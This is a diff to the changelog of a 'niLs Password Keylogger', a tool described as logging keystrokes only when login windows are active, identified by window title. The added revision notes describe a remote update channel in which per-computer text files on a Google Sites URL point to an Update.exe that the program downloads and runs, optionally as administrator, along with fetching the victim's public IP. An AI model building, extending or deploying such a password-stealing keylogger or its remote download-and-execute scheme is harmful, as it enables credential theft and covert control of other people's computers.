@@ -1,6 +1,17 @@
 Project : niLs Password Keylogger
 	Concept : Records Keylog only when certain windows are active. Say, login windows
 		Program identifies active window by its title.
+Revision:1.2.0
+Date: 01/03/2014
+Updates:
+1. If PubIPURL="none" then PublicIP is not downloaded.
+2. Update Package:
+	Create file named "https://sites.google.com/site/nilsklg/" & CompID & ".txt"
+		NewVersion,"URL to Update.exe"
+	Program Will Check if New Version Available and Run Update.exe
+3. If filename in URL ends with - it will run as administrator. else limited user.
+
+
 Revision 1.0.20
 Date : 26/02/2014
 >Objectives:
@@ -30,6 +41,3 @@ Changes:
 1.Transparenting form with API function.
 2.Removed small size frm placed at screen bottom.
 3.Password Protected Package.zip with pwd = 10.
-
-
-
